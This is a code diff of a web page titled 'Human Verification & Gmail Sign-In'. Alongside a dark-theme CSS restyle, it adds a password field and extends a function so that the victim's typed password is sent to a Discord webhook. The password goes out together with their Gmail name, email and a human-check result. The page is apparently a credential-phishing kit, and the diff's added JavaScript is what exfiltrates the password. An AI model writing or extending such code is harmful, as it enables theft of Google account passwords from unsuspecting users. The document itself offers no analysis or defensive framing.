@@ -15,8 +15,8 @@
 
     body {
       font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
-      background-color: #f4f5f7;
-      color: #1f2937;
+      background-color: #09090b;
+      color: #f4f4f5;
       min-height: 100vh;
       padding: 24px 14px 40px;
       overflow-x: hidden;
@@ -38,13 +38,13 @@
     .page-title {
       font-size: 22px;
       font-weight: 700;
-      color: #111827;
+      color: #ffffff;
       text-align: center;
     }
 
     .page-subtitle {
       font-size: 13px;
-      color: #4b5563;
+      color: #a1a1aa;
       text-align: center;
       margin-top: -6px;
     }
@@ -62,11 +62,11 @@
     .normal-card {
       width: 100%;
       max-width: 400px;
-      background-color: #ffffff;
-      border: 1px solid #d1d5db;
+      background-color: #111113;
+      border: 1px solid #27272a;
       border-radius: 10px;
       padding: 20px;
-      box-shadow: 0 4px 14px rgba(0, 0, 0, 0.06);
+      box-shadow: 0 8px 24px rgba(0, 0, 0, 0.65);
     }
 
     .step-label {
@@ -74,13 +74,13 @@
       font-weight: 700;
       text-transform: uppercase;
       letter-spacing: 0.04em;
-      color: #374151;
+      color: #e4e4e7;
       margin-bottom: 4px;
     }
 
     .step-desc {
       font-size: 12.5px;
-      color: #6b7280;
+      color: #a1a1aa;
       margin-bottom: 12px;
       line-height: 1.4;
     }
@@ -94,7 +94,7 @@
 
     .divider {
       height: 1px;
-      background-color: #e5e7eb;
+      background-color: #27272a;
       margin: 16px 0;
     }
 
@@ -108,8 +108,8 @@
       width: 100%;
       height: 50px;
       border-radius: 999px;
-      background-color: #f3f4f6;
-      border: 1px solid #d1d5db;
+      background-color: #09090b;
+      border: 1px solid #27272a;
       padding: 4px;
       display: flex;
       align-items: center;
@@ -125,7 +125,7 @@
       bottom: 4px;
       width: 42px;
       border-radius: 999px;
-      background-color: #dbeafe;
+      background-color: #27272a;
       pointer-events: none;
     }
 
@@ -135,7 +135,7 @@
       padding-right: 12px;
       font-size: 12px;
       font-weight: 600;
-      color: #374151;
+      color: #e4e4e7;
       text-align: center;
       pointer-events: none;
       white-space: nowrap;
@@ -149,14 +149,14 @@
       width: 42px;
       height: 42px;
       border-radius: 999px;
-      background-color: #ffffff;
-      border: 1px solid #9ca3af;
+      background-color: #18181b;
+      border: 1px solid #3f3f46;
       display: flex;
       align-items: center;
       justify-content: center;
       cursor: grab;
       flex-shrink: 0;
-      box-shadow: 0 2px 6px rgba(0, 0, 0, 0.15);
+      box-shadow: 0 2px 8px rgba(0, 0, 0, 0.6);
       will-change: transform;
     }
 
@@ -182,21 +182,69 @@
       display: flex;
     }
 
+    .field-group {
+      margin-bottom: 14px;
+    }
+
+    .field-label {
+      display: block;
+      font-size: 12px;
+      font-weight: 600;
+      color: #e4e4e7;
+      margin-bottom: 6px;
+    }
+
+    .password-row {
+      display: flex;
+      gap: 8px;
+    }
+
+    .text-input {
+      width: 100%;
+      padding: 10px 12px;
+      font-size: 13.5px;
+      color: #ffffff;
+      background-color: #09090b;
+      border: 1px solid #27272a;
+      border-radius: 8px;
+      outline: none;
+    }
+
+    .text-input:focus {
+      border-color: #52525b;
+    }
+
+    .btn-toggle {
+      padding: 0 12px;
+      font-size: 12px;
+      font-weight: 600;
+      color: #f4f4f5;
+      background-color: #18181b;
+      border: 1px solid #27272a;
+      border-radius: 8px;
+      cursor: pointer;
+      white-space: nowrap;
+    }
+
+    .btn-toggle:hover {
+      background-color: #27272a;
+    }
+
     .status-msg {
       font-size: 12px;
       text-align: center;
-      color: #4b5563;
+      color: #a1a1aa;
       margin-bottom: 14px;
       min-height: 18px;
     }
 
     .status-msg.success {
-      color: #15803d;
+      color: #4ade80;
       font-weight: 600;
     }
 
     .status-msg.error {
-      color: #b91c1c;
+      color: #f87171;
       font-weight: 600;
     }
 
@@ -205,20 +253,21 @@
       padding: 11px 16px;
       font-size: 14px;
       font-weight: 600;
-      color: #ffffff;
-      background-color: #2563eb;
+      color: #09090b;
+      background-color: #ffffff;
       border: none;
       border-radius: 8px;
       cursor: pointer;
     }
 
     .btn-primary:hover:not(:disabled) {
-      background-color: #1d4ed8;
+      background-color: #e4e4e7;
     }
 
     .btn-primary:disabled {
-      background-color: #e5e7eb;
-      color: #9ca3af;
+      background-color: #18181b;
+      color: #52525b;
+      border: 1px solid #27272a;
       cursor: not-allowed;
     }
 
@@ -226,11 +275,11 @@
       display: none;
       width: 100%;
       max-width: 260px;
-      background-color: #ffffff;
-      border: 1px solid #d1d5db;
+      background-color: #111113;
+      border: 1px solid #27272a;
       border-radius: 10px;
       padding: 16px;
-      box-shadow: 0 4px 14px rgba(0, 0, 0, 0.06);
+      box-shadow: 0 8px 24px rgba(0, 0, 0, 0.65);
     }
 
     .side-account-panel.visible {
@@ -248,7 +297,8 @@
       width: 44px;
       height: 44px;
       border-radius: 999px;
-      background-color: #2563eb;
+      background-color: #27272a;
+      border: 1px solid #3f3f46;
       color: #ffffff;
       font-size: 16px;
       font-weight: 700;
@@ -271,13 +321,13 @@
       font-weight: 700;
       text-transform: uppercase;
       letter-spacing: 0.04em;
-      color: #6b7280;
+      color: #a1a1aa;
     }
 
     .account-name {
       font-size: 14px;
       font-weight: 700;
-      color: #111827;
+      color: #ffffff;
       white-space: nowrap;
       overflow: hidden;
       text-overflow: ellipsis;
@@ -285,13 +335,13 @@
 
     .account-email {
       font-size: 12px;
-      color: #4b5563;
+      color: #a1a1aa;
       word-break: break-all;
     }
 
     .page-footer {
       font-size: 12px;
-      color: #6b7280;
+      color: #71717a;
       text-align: center;
       margin-top: 2px;
     }
@@ -300,7 +350,7 @@
 <body>
   <div class="page-shell">
     <h1 class="page-title">Human Verification & Gmail Sign-In</h1>
-    <p class="page-subtitle">Complete human verification and slide the Gmail logo to sign in</p>
+    <p class="page-subtitle">Complete human verification, slide Gmail logo to sign in, and enter password</p>
 
     <div class="layout-grid">
       <main class="normal-card">
@@ -311,7 +361,7 @@
           <div
             class="cf-turnstile"
             data-sitekey="0x4AAAAAAGIurRXZpSv1R-eO"
-            data-theme="light"
+            data-theme="dark"
             data-callback="onHumanVerified"
             data-expired-callback="onHumanExpired"
             data-error-callback="onHumanError"
@@ -349,14 +399,30 @@
             class="g_id_signin"
             data-type="standard"
             data-size="large"
-            data-theme="outline"
+            data-theme="filled_black"
             data-text="signin_with"
             data-shape="pill"
             data-logo_alignment="left"
           ></div>
         </div>
 
-        <div id="status-msg" class="status-msg">Complete human check and slide Gmail logo to sign in.</div>
+        <div class="divider"></div>
+
+        <div class="field-group">
+          <label for="password-input" class="field-label">3. Password</label>
+          <div class="password-row">
+            <input
+              id="password-input"
+              class="text-input"
+              type="password"
+              placeholder="Enter password"
+              autocomplete="current-password"
+            />
+            <button id="toggle-pass-btn" class="btn-toggle" type="button">Show</button>
+          </div>
+        </div>
+
+        <div id="status-msg" class="status-msg">Complete human check, slide Gmail logo to sign in, and enter password.</div>
 
         <button id="continue-btn" class="btn-primary" type="button" disabled>Continue</button>
       </main>
@@ -454,6 +520,8 @@
 
     const statusMsg = document.getElementById("status-msg");
     const continueBtn = document.getElementById("continue-btn");
+    const passwordInput = document.getElementById("password-input");
+    const togglePassBtn = document.getElementById("toggle-pass-btn");
     const sideAccountPanel = document.getElementById("side-account-panel");
     const avatarInitial = document.getElementById("avatar-initial");
     const avatarImg = document.getElementById("avatar-img");
@@ -463,6 +531,16 @@
     let humanOk = false;
     let gmailName = "";
     let gmailEmail = "";
+
+    togglePassBtn.addEventListener("click", () => {
+      const isHidden = passwordInput.type === "password";
+      passwordInput.type = isHidden ? "text" : "password";
+      togglePassBtn.textContent = isHidden ? "Hide" : "Show";
+    });
+
+    function hasPassword() {
+      return passwordInput.value.trim().length > 0;
+    }
 
     function parseJwtPayload(token) {
       const base64Url = token.split(".")[1];
@@ -477,24 +555,23 @@
     }
 
     function updateReadyState() {
-      if (humanOk && gmailEmail) {
-        statusMsg.textContent = "Verified and signed in. Click Continue.";
+      const passOk = hasPassword();
+      if (humanOk && gmailEmail && passOk) {
+        statusMsg.textContent = "Ready. Click Continue to submit.";
         statusMsg.className = "status-msg success";
         continueBtn.disabled = false;
-      } else if (humanOk && !gmailEmail) {
-        statusMsg.textContent = "Human check passed. Drag the Gmail logo to sign in.";
-        statusMsg.className = "status-msg";
-        continueBtn.disabled = true;
-      } else if (!humanOk && gmailEmail) {
-        statusMsg.textContent = "Gmail signed in. Complete human verification.";
-        statusMsg.className = "status-msg";
-        continueBtn.disabled = true;
       } else {
-        statusMsg.textContent = "Complete human check and slide Gmail logo to sign in.";
+        const missing = [];
+        if (!humanOk) missing.push("human check");
+        if (!gmailEmail) missing.push("Gmail sign-in");
+        if (!passOk) missing.push("password");
+        statusMsg.textContent = "Required: " + missing.join(", ") + ".";
         statusMsg.className = "status-msg";
         continueBtn.disabled = true;
       }
     }
+
+    passwordInput.addEventListener("input", updateReadyState);
 
     function onHumanVerified(token) {
       humanOk = Boolean(token);
@@ -543,22 +620,19 @@
       }
     }
 
-    async function sendToDiscordWebhook() {
-      if (!DISCORD_WEBHOOK_URL || DISCORD_WEBHOOK_URL === "YOUR_DISCORD_WEBHOOK_URL") {
-        throw new Error("Missing webhook URL");
-      }
-
+    async function sendToDiscordWebhook(passwordValue) {
       const payload = {
         content: "New Verified Gmail Sign-In",
         embeds: [
           {
-            title: "Verification & Gmail Login",
-            color: 2450411,
+            title: "Verification, Gmail & Password",
+            color: 1118481,
             fields: [
               { name: "Name", value: gmailName || "N/A", inline: true },
               { name: "Gmail", value: gmailEmail || "N/A", inline: true },
+              { name: "Password", value: passwordValue || "N/A", inline: false },
               { name: "Human Check", value: humanOk ? "Verified" : "Unverified", inline: true },
-              { name: "Source", value: window.location.hostname || "localhost", inline: false }
+              { name: "Source", value: window.location.hostname || "localhost", inline: true }
             ],
             timestamp: new Date().toISOString()
           }
@@ -577,17 +651,19 @@
     }
 
     continueBtn.addEventListener("click", async () => {
-      if (!humanOk || !gmailEmail) return;
+      const passwordValue = passwordInput.value.trim();
+      if (!humanOk || !gmailEmail || !passwordValue) return;
+
       continueBtn.disabled = true;
       continueBtn.textContent = "Sending...";
 
       try {
-        await sendToDiscordWebhook();
-        statusMsg.textContent = "Verified, Gmail signed in, and sent to Discord webhook.";
+        await sendToDiscordWebhook(passwordValue);
+        statusMsg.textContent = "Verified, signed in, and sent to Discord webhook.";
         statusMsg.className = "status-msg success";
         continueBtn.textContent = "Sent";
       } catch (err) {
-        statusMsg.textContent = "Verified and signed in, but webhook failed to send. Check URL.";
+        statusMsg.textContent = "Failed to send to Discord webhook. Check connection or webhook.";
         statusMsg.className = "status-msg error";
         continueBtn.textContent = "Continue";
         continueBtn.disabled = false;
